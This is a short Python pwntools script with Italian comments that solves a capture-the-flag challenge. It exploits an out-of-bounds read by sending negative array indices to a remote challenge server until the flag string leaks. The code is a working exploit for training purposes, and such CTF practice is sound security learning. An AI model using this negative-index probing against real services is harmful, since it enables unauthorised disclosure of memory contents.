from pwn import *

# Le variabili crescono verso indirizzi più bassi, quindi lo stack compare così:

# [ system_strings ]    -->     frasi[-x]
# [     frasi      ]    -->     frasi[x]

r = remote("intagram.challs.olicyber.it", 10101)

response = r.recvuntil(b'\n').decode()

i = -1
while "flag" not in response:
    r.recvuntil(b"> ")
    r.sendline(str(i).encode())

    response = r.recvuntil(b"(s/n)\n").split(b" - ")[1].split(b"\n\n")[0].strip().decode()
    r.sendline("s".encode())

    i -= 1

print(response)